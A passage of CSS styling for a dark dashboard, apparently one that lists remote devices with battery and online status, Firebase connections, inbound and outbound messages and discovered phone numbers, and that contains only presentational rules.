    transition:
      background 80ms,
      border-color 80ms;
  }
  .dev-item:hover {
    background: rgba(255, 255, 255, 0.04);
  }
  .dev-item.selected {
    background: rgba(249, 115, 22, 0.09);
    border-left-color: #f97316;
  }
  .di-left {
    display: flex;
    align-items: center;
    gap: 8px;
    min-width: 0;
    flex: 1;
  }
  .di-right {
    display: flex;
    align-items: center;
    gap: 5px;
    flex-shrink: 0;
  }
  .dev-check {
    width: 13px;
    height: 13px;
    accent-color: #f97316;
    cursor: pointer;
    flex-shrink: 0;
  }
  .dev-used {
    opacity: 0.45;
  }
  .dot {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .dot-on {
    background: #22c55e;
    box-shadow: 0 0 5px rgba(34, 197, 94, 0.6);
  }
  .dot-off {
    background: #2d3748;
  }
  .dot-unk {
    background: #1e2a3a;
    border: 1px solid #334155;
  }
  .di-id {
    font-size: 11.5px;
    font-weight: 600;
    color: #e2e8f0;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .di-sub {
    font-size: 10px;
    color: #64748b;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    margin-top: 1px;
  }
  .bat-pill {
    font-size: 11px;
    font-weight: 700;
    padding: 2px 6px;
    border-radius: 4px;
    border: 1px solid;
    flex-shrink: 0;
    font-family: "JetBrains Mono", monospace;
  }
  .load-more {
    width: 100%;
    padding: 8px;
    font-size: 11px;
    color: #f97316;
    background: none;
    border: none;
    border-top: 1px solid rgba(255, 255, 255, 0.05);
    cursor: pointer;
    font-family: inherit;
    transition: background 120ms;
  }
  .load-more:hover {
    background: rgba(249, 115, 22, 0.06);
  }
  .list-empty {
    padding: 20px;
    text-align: center;
    font-size: 12px;
    color: #334155;
  }

  .side-footer {
    border-top: 1px solid rgba(255, 255, 255, 0.07);
    padding: 8px 10px;
    flex-shrink: 0;
  }
  .sf-hdr {
    font-size: 9px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #334155;
    margin-bottom: 5px;
  }
  .conn-scroll {
    max-height: calc(22px * 10 + 5px); /* 10 rows max */
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: thin;
    scrollbar-color: rgba(255, 255, 255, 0.1) transparent;
    user-select: none;
  }
  .conn-scroll::-webkit-scrollbar {
    width: 3px;
  }
  .conn-scroll::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.12);
    border-radius: 3px;
  }
  .conn-row {
    display: flex;
    align-items: center;
    gap: 5px;
    padding: 3px 2px;
  }
  .cr-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .cr-name {
    font-size: 11px;
    color: #94a3b8;
    flex: 1;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .cr-cnt {
    font-size: 10px;
    font-weight: 700;
    font-family: "JetBrains Mono", monospace;
  }
  .cr-status {
    display: flex;
    align-items: center;
    gap: 3px;
    flex-shrink: 0;
  }
  .cr-on-dot {
    width: 5px;
    height: 5px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .cr-tog {
    width: 26px;
    height: 14px;
    border-radius: 7px;
    border: none;
    cursor: pointer;
    position: relative;
    transition: background 200ms;
    flex-shrink: 0;
  }
  .cr-tog.ton {
    background: #f97316;
  }
  .cr-tog.toff {
    background: #1e293b;
    border: 1px solid #334155;
  }
  .cr-knob {
    position: absolute;
    top: 1px;
    width: 12px;
    height: 12px;
    background: white;
    border-radius: 50%;
    transition: left 200ms;
  }
  .cr-tog.ton .cr-knob {
    left: 13px;
  }
  .cr-tog.toff .cr-knob {
    left: 1px;
  }
  .cr-rm {
    background: none;
    border: none;
    color: #475569;
    font-size: 15px;
    cursor: pointer;
    width: 18px;
    height: 18px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 3px;
    padding: 0;
    font-family: inherit;
    transition: all 120ms;
    line-height: 1;
  }
  .cr-rm:hover {
    color: #ef4444;
    background: rgba(239, 68, 68, 0.1);
  }
  .add-fb-btn {
    display: flex;
    align-items: center;
    gap: 6px;
    width: 100%;
    margin-top: 8px;
    padding: 7px 8px;
    border-radius: 6px;
    border: 1px dashed rgba(249, 115, 22, 0.3);
    background: transparent;
    color: #f97316;
    font-size: 11.5px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    transition: all 140ms;
  }
  .add-fb-btn:hover {
    background: rgba(249, 115, 22, 0.08);
    border-color: #f97316;
  }

  /* ── MAIN ────────────────────────────────────────────────────────────── */
  .main {
    flex: 1;
    display: flex;
    flex-direction: column;
    min-width: 0;
    min-height: 0;
    height: 100%;
    overflow: hidden;
  }

  .topbar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 20px;
    height: 44px;
    background: #0e1420;
    border-bottom: 1px solid rgba(255, 255, 255, 0.07);
    flex-shrink: 0;
    gap: 10px;
  }
  .tb-l {
    display: flex;
    align-items: center;
    gap: 10px;
    min-width: 0;
  }
  .refresh-cd {
    font-size: 11px;
    color: #334155;
    font-family: "JetBrains Mono", monospace;
  }
  .bg-refresh {
    display: flex;
    align-items: center;
    gap: 5px;
    color: #34d399;
  }
  .bg-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: #34d399;
    display: inline-block;
    animation: bg-pulse 1.2s ease-in-out infinite;
    box-shadow: 0 0 6px rgba(52, 211, 153, 0.7);
  }
  @keyframes bg-pulse {
    0%,
    100% {
      opacity: 1;
      transform: scale(1);
    }
    50% {
      opacity: 0.4;
      transform: scale(0.7);
    }
  }
  .tb-r {
    display: flex;
    align-items: center;
    gap: 8px;
    flex-shrink: 0;
  }
  .tbstat {
    font-size: 12px;
    font-weight: 700;
    padding: 3px 10px;
    border-radius: 20px;
    white-space: nowrap;
  }
  .tt {
    background: rgba(255, 255, 255, 0.06);
    color: #94a3b8;
    border: 1px solid rgba(255, 255, 255, 0.1);
  }
  .to {
    background: rgba(34, 197, 94, 0.14);
    color: #22c55e;
    border: 1px solid rgba(34, 197, 94, 0.3);
  }
  .tf {
    background: rgba(239, 68, 68, 0.1);
    color: #ef4444;
    border: 1px solid rgba(239, 68, 68, 0.25);
  }
  .ico-btn {
    width: 30px;
    height: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 6px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    background: rgba(255, 255, 255, 0.04);
    color: #64748b;
    cursor: pointer;
    transition: all 140ms;
    font-family: inherit;
  }
  .ico-btn:hover {
    color: #e2e8f0;
    border-color: rgba(255, 255, 255, 0.2);
    background: rgba(255, 255, 255, 0.08);
  }
  .ico-active {
    color: #f97316 !important;
    border-color: rgba(249, 115, 22, 0.4) !important;
    background: rgba(249, 115, 22, 0.08) !important;
  }
  .ico-muted {
    color: #ef4444 !important;
    border-color: rgba(239, 68, 68, 0.35) !important;
    background: rgba(239, 68, 68, 0.08) !important;
  }
  .notif-clear-btn {
    display: flex;
    align-items: center;
    gap: 3px;
    width: auto !important;
    padding: 0 8px !important;
    color: #f97316 !important;
    border-color: rgba(249, 115, 22, 0.35) !important;
  }

  .add-panel {
    background: #0e1420;
    border-bottom: 1px solid rgba(255, 255, 255, 0.07);
    padding: 14px 20px;
    flex-shrink: 0;
  }
  .ap-hdr {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 10px;
    font-size: 13px;
    font-weight: 600;
  }
  .ap-grid {
    display: grid;
    grid-template-columns: 1fr 2fr 1fr 1fr 1fr;
    gap: 10px;
  }
  .ap-foot {
    display: flex;
    justify-content: flex-end;
    gap: 8px;
    margin-top: 10px;
  }

  /* Mode toggle (Single / Bulk) */
  .ap-mode-toggle { display:flex; gap:2px; background:rgba(255,255,255,0.06); border-radius:6px; padding:2px; }
  .ap-mode-btn { padding:4px 12px; font-size:11px; font-weight:600; border:none; border-radius:5px; background:transparent; color:#64748b; cursor:pointer; font-family:inherit; transition:all 140ms; }
  .ap-mode-btn:hover { color:#94a3b8; }
  .ap-mode-active { background:#f97316!important; color:#fff!important; box-shadow:0 1px 4px rgba(249,115,22,0.3); }

  /* Bulk area */
  .bulk-area { display:flex; flex-direction:column; gap:10px; }
  .bulk-hint { display:flex; align-items:flex-start; gap:6px; font-size:11px; color:#64748b; line-height:1.4; padding:8px 10px; background:rgba(249,115,22,0.06); border:1px solid rgba(249,115,22,0.15); border-radius:6px; }
  .bulk-hint svg { flex-shrink:0; margin-top:1px; color:#f97316; }
  .bulk-input { width:100%; resize:vertical; min-height:80px; font-family:'JetBrains Mono',monospace; font-size:11.5px; line-height:1.5; padding:10px; border-radius:6px; border:1px solid rgba(255,255,255,0.1); background:rgba(0,0,0,0.3); color:#e2e8f0; outline:none; transition:border-color 140ms; }
  .bulk-input:focus { border-color:rgba(249,115,22,0.5); }
  .bulk-input::placeholder { color:#334155; }
  .bulk-preview { padding:8px 10px; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.07); border-radius:6px; }
  .bulk-count { font-size:11px; font-weight:700; color:#22c55e; display:block; margin-bottom:6px; }
  .bulk-urls { display:flex; flex-direction:column; gap:3px; max-height:140px; overflow-y:auto; }
  .bulk-urls::-webkit-scrollbar { width:3px; }
  .bulk-urls::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.1); border-radius:99px; }
  .bulk-url-row { display:flex; align-items:center; gap:6px; font-size:11px; padding:3px 0; }
  .bulk-idx { width:18px; text-align:center; font-weight:700; color:#64748b; flex-shrink:0; font-family:'JetBrains Mono',monospace; }
  .bulk-url-name { font-weight:600; color:#e2e8f0; flex-shrink:0; min-width:70px; }
  .bulk-url-val { color:#64748b; font-family:'JetBrains Mono',monospace; font-size:10px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; min-width:0; flex:1; }
  .bulk-dup { font-size:9px; font-weight:700; text-transform:uppercase; color:#fbbf24; background:rgba(251,191,36,0.12); padding:1px 6px; border-radius:3px; flex-shrink:0; }

  .raw-drawer {
    background: #0a0d16;
    border-bottom: 1px solid rgba(255, 255, 255, 0.07);
    padding: 12px 20px;
    display: flex;
    flex-direction: column;
    gap: 10px;
    flex-shrink: 0;
    max-height: 40vh;
    overflow-y: auto;
  }
  .rd-top {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .rd-lbl {
    font-size: 10px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.08em;
    color: #64748b;
    flex: 1;
  }
  .rd-row {
    display: flex;
    gap: 8px;
    align-items: center;
  }
  .method-sel {
    font-family: "JetBrains Mono", monospace;
    font-size: 12px;
    font-weight: 700;
    color: #f97316;
    background: #0d1117;
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 5px;
    padding: 7px 8px;
    cursor: pointer;
    outline: none;
  }
  .rd-path {
    flex: 1;
    font-family: "JetBrains Mono", monospace;
    font-size: 12px;
  }
  .s-pill {
    display: inline-flex;
    font-size: 11px;
    font-weight: 600;
    padding: 2px 8px;
    border-radius: 4px;
  }
  .sp-ok {
    background: rgba(34, 197, 94, 0.12);
    color: #22c55e;
    border: 1px solid rgba(34, 197, 94, 0.3);
  }
  .sp-err {
    background: rgba(239, 68, 68, 0.1);
    color: #ef4444;
    border: 1px solid rgba(239, 68, 68, 0.25);
  }
  .tiny-sel {
    background: #0d1117;
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 5px;
    padding: 5px 8px;
    font-size: 12px;
    color: #e2e8f0;
    cursor: pointer;
    outline: none;
    font-family: inherit;
  }

  .tab-bar {
    display: flex;
    background: #0e1420;
    border-bottom: 2px solid rgba(255, 255, 255, 0.07);
    flex-shrink: 0;
    padding: 0 18px;
    gap: 2px;
  }
  .tab {
    padding: 10px 18px;
    font-size: 13px;
    font-weight: 500;
    color: #64748b;
    background: none;
    border: none;
    border-bottom: 2px solid transparent;
    margin-bottom: -2px;
    cursor: pointer;
    font-family: inherit;
    transition: all 130ms;
    white-space: nowrap;
  }
  .tab:hover:not(:disabled) {
    color: #94a3b8;
  }
  .tab.active {
    color: #f97316;
    border-bottom-color: #f97316;
  }
  .tab:disabled {
    opacity: 0.3;
    cursor: not-allowed;
  }

  .tab-body {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    -webkit-overflow-scrolling: touch;
    overscroll-behavior-y: contain;
    padding: 18px 22px 40px;
    display: flex;
    flex-direction: column;
    gap: 14px;
    min-height: 0;
  }
  .tab-body::-webkit-scrollbar {
    width: 5px;
  }
  .tab-body::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.09);
    border-radius: 99px;
  }

  .tab-body-overview {
    overflow: hidden !important;
    padding: 12px 18px 12px;
    gap: 10px;
    height: 100%;
    min-height: 0;
    display: flex;
    flex-direction: column;
  }

  .no-sel {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 14px;
    color: #475569;
    font-size: 14px;
    min-height: 220px;
  }

  /* OVERVIEW */
  .live-card {
    display: flex;
    align-items: center;
    gap: 14px;
    background: #141b2d;
    border: 1px solid rgba(249, 115, 22, 0.2);
    border-top: 3px solid #f97316;
    border-radius: 10px;
    padding: 14px 18px;
    flex-shrink: 0;
  }
  .lc-icon {
    width: 52px;
    height: 52px;
    background: rgba(249, 115, 22, 0.08);
    border: 1px solid rgba(249, 115, 22, 0.2);
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  .lc-title {
    font-size: 17px;
    font-weight: 700;
    color: #f97316;
  }
  .lc-sub {
    font-size: 12px;
    color: #94a3b8;
    margin-top: 3px;
  }
  .stat-row {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 10px;
    flex-shrink: 0;
  }
  .stat-card {
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-top: 3px solid;
    border-radius: 10px;
    padding: 16px 18px;
  }
  .sc-n {
    font-size: 38px;
    font-weight: 800;
    font-family: "JetBrains Mono", monospace;
    line-height: 1;
    letter-spacing: -0.04em;
    color: #38bdf8;
  }
  .sc-l {
    font-size: 10px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #64748b;
    margin-top: 4px;
  }
  .dt-card {
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 10px;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    flex: 1;
    min-height: 0;
  }
  .dt-filters {
    flex-shrink: 0;
  }
  .dt-scroll {
    flex: 1;
    min-height: 0;
    overflow-y: auto;
    overflow-x: hidden;
    -webkit-overflow-scrolling: touch;
    overscroll-behavior-y: contain;
    scrollbar-width: thin;
    scrollbar-color: rgba(255, 255, 255, 0.22) transparent;
  }
  .dt-scroll::-webkit-scrollbar {
    width: 6px;
  }
  .dt-scroll::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.22);
    border-radius: 99px;
  }

  .dt-scroll {
    overflow-y: auto;
    overflow-x: hidden;
    max-height: 540px;
    -webkit-overflow-scrolling: touch;
    overscroll-behavior-y: contain;
    scrollbar-width: thin;
    scrollbar-color: rgba(255, 255, 255, 0.12) transparent;
  }
  .dt-scroll::-webkit-scrollbar {
    width: 5px;
  }
  .dt-scroll::-webkit-scrollbar-track {
    background: transparent;
  }
  .dt-scroll::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.12);
    border-radius: 4px;
  }
  .dt-scroll::-webkit-scrollbar-thumb:hover {
    background: rgba(255, 255, 255, 0.22);
  }
  .dt-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 12.5px;
  }
  .dt-row {
    cursor: pointer;
    transition: background 80ms;
    border-bottom: 1px solid rgba(255, 255, 255, 0.03);
  }
  .dt-row:last-child {
    border-bottom: none;
  }
  .dt-row:hover {
    background: rgba(255, 255, 255, 0.03);
  }
  .dt-row.dt-sel {
    background: rgba(249, 115, 22, 0.07);
  }
  .td-st {
    display: flex;
    align-items: center;
    gap: 7px;
  }
  .td-dot {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .ton {
    background: #22c55e;
    box-shadow: 0 0 5px rgba(34, 197, 94, 0.5);
  }
  .toff {
    background: #2d3748;
  }
  .tunk {
    background: #1a2236;
    border: 1px solid #253048;
  }
  .son {
    color: #22c55e;
    font-weight: 600;
  }
  .soff {
    color: #64748b;
    font-weight: 600;
  }
  .sunk {
    color: #334155;
    font-weight: 600;
  }
  .td-key {
    font-size: 11.5px;
    color: #e2e8f0;
  }
  .td-num {
    font-size: 12px;
    color: #94a3b8;
  }
  .td-del {
    background: none;
    border: none;
    color: #475569;
    font-size: 16px;
    cursor: pointer;
    width: 22px;
    height: 22px;
    border-radius: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 120ms;
    padding: 0;
    font-family: inherit;
    line-height: 1;
  }
  .td-del:hover {
    color: #ef4444;
    background: rgba(239, 68, 68, 0.12);
  }
  .dt-used {
    opacity: 0.45;
  }
  .td-fb-dot {
    display: inline-block;
    width: 6px;
    height: 6px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .td-new {
    font-size: 9px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.07em;
    padding: 1px 5px;
    border-radius: 4px;
    background: rgba(251, 191, 36, 0.15);
    color: #fbbf24;
    border: 1px solid rgba(251, 191, 36, 0.3);
    flex-shrink: 0;
  }

  /* ── Dashboard filter bar ──────────────────────────────────────────────── */
  .dt-filters {
    padding: 10px 12px 6px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    display: flex;
    flex-direction: column;
    gap: 7px;
  }
  .dt-chips {
    display: flex;
    gap: 5px;
    flex-wrap: wrap;
  }
  .dt-chip {
    display: flex;
    align-items: center;
    gap: 4px;
    padding: 4px 10px;
    border-radius: 20px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    background: rgba(255, 255, 255, 0.04);
    color: #64748b;
    font-size: 11px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    transition: all 140ms;
    white-space: nowrap;
  }
  .dt-chip:hover {
    color: #94a3b8;
    border-color: rgba(255, 255, 255, 0.2);
  }
  .dt-chip-cnt {
    font-size: 10px;
    font-weight: 700;
    font-family: "JetBrains Mono", monospace;
  }
  /* Active chip states */
  .dca {
    background: #f97316 !important;
    color: #fff !important;
    border-color: #f97316 !important;
  }
  .dco {
    background: rgba(34, 197, 94, 0.18) !important;
    color: #22c55e !important;
    border-color: rgba(34, 197, 94, 0.4) !important;
  }
  .dcx {
    background: rgba(239, 68, 68, 0.14) !important;
    color: #ef4444 !important;
    border-color: rgba(239, 68, 68, 0.3) !important;
  }
  .dcn {
    background: rgba(56, 189, 248, 0.15) !important;
    color: #38bdf8 !important;
    border-color: rgba(56, 189, 248, 0.35) !important;
  }
  .dcu {
    background: rgba(167, 139, 250, 0.15) !important;
    color: #a78bfa !important;
    border-color: rgba(167, 139, 250, 0.35) !important;
  }
  .dcnew {
    border-color: rgba(251, 191, 36, 0.3) !important;
    color: #fbbf24 !important;
  }
  .dcnew-a {
    background: rgba(251, 191, 36, 0.18) !important;
  }
  .dt-chip-clear {
    display: flex;
    align-items: center;
    gap: 3px;
    padding: 3px 9px;
    border-radius: 20px;
    border: 1px solid rgba(239, 68, 68, 0.35);
    background: rgba(239, 68, 68, 0.1);
    color: #ef4444;
    font-size: 11px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    transition: all 140ms;
    white-space: nowrap;
  }
  .dt-chip-clear:hover {
    background: rgba(239, 68, 68, 0.2);
  }

  /* Firebase badge row */
  .dt-fb-row {
    display: flex;
    align-items: center;
    gap: 8px;
    flex-wrap: nowrap;
    overflow-x: auto;
    scrollbar-width: none;
    padding-bottom: 2px;
  }
  .dt-fb-row::-webkit-scrollbar {
    display: none;
  }
  .dt-fb-lbl {
    font-size: 9px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #334155;
    flex-shrink: 0;
  }
  .dt-fb-badges {
    display: flex;
    gap: 5px;
    flex-wrap: nowrap;
  }
  .conn-badge {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    font-size: 9.5px;
    font-weight: 700;
    padding: 3px 8px;
    border-radius: 5px;
    border: 1px solid;
    cursor: pointer;
    font-family: inherit;
    transition: all 140ms;
    white-space: nowrap;
    flex-shrink: 0;
    background: transparent;
  }
  .conn-badge:hover {
    filter: brightness(1.2);
  }
  .cb-active {
    box-shadow: 0 0 0 1px currentColor;
  }
  .cb-dot {
    width: 5px;
    height: 5px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .cb-n {
    font-family: "JetBrains Mono", monospace;
    font-size: 9px;
    font-weight: 700;
    opacity: 0.8;
  }

  /* Filtered result count */
  .dt-count {
    padding: 5px 14px;
    font-size: 10.5px;
    color: #475569;
    font-weight: 600;
    border-bottom: 1px solid rgba(255, 255, 255, 0.04);
  }

  /* DEVICE */
  .dv-card {
    display: flex;
    align-items: center;
    gap: 14px;
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-top: 3px solid #f97316;
    border-radius: 10px;
    padding: 16px 20px;
  }
  .dv-left {
    display: flex;
    align-items: center;
    gap: 12px;
    flex: 1;
    min-width: 0;
  }
  .dv-ico {
    width: 48px;
    height: 48px;
    border-radius: 10px;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.1);
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  .dv-id {
    font-size: 20px;
    font-weight: 700;
    color: #e2e8f0;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .ob {
    font-size: 10px;
    font-weight: 700;
    padding: 3px 10px;
    border-radius: 20px;
    text-transform: uppercase;
    letter-spacing: 0.05em;
  }
  .ob-on {
    background: rgba(34, 197, 94, 0.15);
    color: #22c55e;
    border: 1px solid rgba(34, 197, 94, 0.3);
  }
  .ob-off {
    background: rgba(100, 116, 139, 0.1);
    color: #64748b;
    border: 1px solid rgba(100, 116, 139, 0.2);
  }
  .ob-unk {
    background: rgba(100, 116, 139, 0.07);
    color: #334155;
    border: 1px solid rgba(100, 116, 139, 0.12);
  }
  .dv-bat {
    display: flex;
    flex-direction: column;
    align-items: flex-end;
    gap: 2px;
    flex-shrink: 0;
  }
  .dv-bat-n {
    font-size: 44px;
    font-weight: 800;
    font-family: "JetBrains Mono", monospace;
    line-height: 1;
    letter-spacing: -0.04em;
  }
  .dv-bat-l {
    font-size: 9px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #64748b;
  }
  .bat-track {
    width: 80px;
    height: 4px;
    background: rgba(255, 255, 255, 0.09);
    border-radius: 2px;
    overflow: hidden;
    margin-top: 4px;
  }
  .bat-fill {
    height: 100%;
    border-radius: 2px;
    transition: width 600ms;
  }
  .info-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 10px;
    overflow: hidden;
  }
  .ib {
    display: flex;
    flex-direction: column;
    gap: 4px;
    padding: 12px 14px;
    border-right: 1px solid rgba(255, 255, 255, 0.07);
  }
  .ib:last-child {
    border-right: none;
  }
  .ib-l {
    font-size: 9.5px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.08em;
    color: #64748b;
  }
  .ib-v {
    font-size: 13.5px;
    font-weight: 600;
    color: #e2e8f0;
  }
  .act-row {
    display: flex;
    gap: 10px;
  }
  .dev-used-row {
    display: flex;
    align-items: center;
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 8px;
    padding: 10px 14px;
  }
  .dev-used-label {
    display: flex;
    align-items: center;
    gap: 8px;
    cursor: pointer;
    font-size: 13px;
    font-weight: 600;
    color: #94a3b8;
    user-select: none;
  }
  .dev-used-label:has(input:checked) {
    color: #22c55e;
  }
  .dev-used-label input {
    accent-color: #f97316;
    width: 15px;
    height: 15px;
    cursor: pointer;
  }
  .act-btn {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    padding: 14px;
    border-radius: 9px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    border: none;
    font-family: inherit;
    transition: all 160ms;
  }
  .ab-msg {
    background: #4f46e5;
    color: #fff;
    box-shadow: 0 4px 18px rgba(79, 70, 229, 0.4);
  }
  .ab-msg:hover {
    background: #4338ca;
    transform: translateY(-1px);
  }
  .ab-snd {
    background: #16a34a;
    color: #fff;
    box-shadow: 0 4px 18px rgba(22, 163, 74, 0.4);
  }
  .ab-snd:hover:not(:disabled) {
    background: #15803d;
    transform: translateY(-1px);
  }
  .ab-snd:disabled {
    opacity: 0.4;
    cursor: not-allowed;
    transform: none;
  }
  .afc {
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 10px;
    overflow: hidden;
  }
  .afc-hdr {
    padding: 8px 12px;
    font-size: 10px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #64748b;
    border-bottom: 1px solid rgba(255, 255, 255, 0.07);
  }
  .afc-body {
    max-height: 320px;
    overflow-y: auto;
  }
  .af-row {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 6px 12px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.03);
  }
  .af-row:hover {
    background: rgba(255, 255, 255, 0.03);
  }
  .af-k {
    font-size: 11px;
    color: #64748b;
    min-width: 100px;
    max-width: 120px;
    flex-shrink: 0;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .af-v {
    font-size: 12px;
    color: #e2e8f0;
    flex: 1;
    word-break: break-all;
  }
  .af-cp {
    background: none;
    border: none;
    color: #475569;
    cursor: pointer;
    padding: 3px;
    border-radius: 3px;
    transition: all 120ms;
    font-family: inherit;
    flex-shrink: 0;
  }
  .af-cp:hover {
    color: #94a3b8;
  }
  .bool-b {
    padding: 1px 7px;
    border-radius: 4px;
    font-size: 10.5px;
    font-weight: 700;
    font-family: "JetBrains Mono", monospace;
  }
  .bt {
    background: rgba(34, 197, 94, 0.15);
    color: #22c55e;
    border: 1px solid rgba(34, 197, 94, 0.3);
  }
  .bf {
    background: rgba(239, 68, 68, 0.12);
    color: #ef4444;
    border: 1px solid rgba(239, 68, 68, 0.25);
  }

  /* MESSAGES */
  .msg-topbar {
    display: flex;
    align-items: center;
    gap: 10px;
    flex-wrap: wrap;
  }
  .msg-count {
    font-size: 17px;
    font-weight: 700;
    color: #e2e8f0;
    white-space: nowrap;
  }
  .msg-search-wrap {
    flex: 1;
    display: flex;
    align-items: center;
    gap: 6px;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.09);
    border-radius: 7px;
    padding: 7px 10px;
    min-width: 180px;
  }
  .msg-search {
    background: none;
    border: none;
    outline: none;
    font-size: 13px;
    color: #e2e8f0;
    width: 100%;
    font-family: inherit;
  }
  .msg-search::placeholder {
    color: #475569;
  }
  .msg-tabs {
    display: flex;
    gap: 4px;
    flex-shrink: 0;
  }
  .mtab {
    padding: 6px 14px;
    border-radius: 6px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    background: rgba(255, 255, 255, 0.04);
    color: #64748b;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    transition: all 120ms;
  }
  .mta {
    background: #f97316 !important;
    color: #fff !important;
    border-color: #f97316 !important;
  }
  .mti {
    background: rgba(56, 189, 248, 0.15) !important;
    color: #38bdf8 !important;
    border-color: rgba(56, 189, 248, 0.35) !important;
  }
  .mto {
    background: rgba(249, 115, 22, 0.15) !important;
    color: #f97316 !important;
    border-color: rgba(249, 115, 22, 0.35) !important;
  }
  .msg-list {
    display: flex;
    flex-direction: column;
    gap: 8px;
  }
  .msg-card {
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 9px;
    padding: 10px 12px;
    display: flex;
    flex-direction: column;
    gap: 5px;
    transition: background 80ms;
  }
  .msg-card:hover {
    background: #172035;
  }
  .mc-row {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .mc-sender {
    font-size: 13px;
    font-weight: 700;
    color: #e2e8f0;
  }
  .mc-badge {
    font-size: 10px;
    font-weight: 700;
    padding: 2px 8px;
    border-radius: 10px;
    text-transform: uppercase;
    letter-spacing: 0.05em;
  }
  .badge-in {
    background: rgba(34, 197, 94, 0.15);
    color: #22c55e;
    border: 1px solid rgba(34, 197, 94, 0.3);
  }
  .badge-out {
    background: rgba(249, 115, 22, 0.15);
    color: #f97316;
    border: 1px solid rgba(249, 115, 22, 0.3);
  }
  .mc-body {
    font-size: 12.5px;
    color: #cbd5e1;
    line-height: 1.5;
    display: -webkit-box;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
    overflow: hidden;
  }
  .mc-foot {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .mc-dt {
    font-size: 10.5px;
    color: #475569;
    font-family: "JetBrains Mono", monospace;
  }

  /* SEND */
  /* ── Discovered Numbers Tab ──────────────────────────────────── */
  .disc-wrap { max-width: 700px; }
  .disc-hdr { margin-bottom: 12px; }
  .disc-hdr-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
  .disc-title { font-size: 18px; font-weight: 800; margin: 0; display: flex; align-items: center; gap: 6px; }
  .disc-count { font-size: 11px; color: #64748b; font-weight: 600; }
  .disc-controls { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
  .disc-search {
    flex: 1; min-width: 160px; padding: 7px 10px; font-size: 12px;
    background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08);
    border-radius: 7px; color: #e2e8f0; font-family: inherit; outline: none;
  }
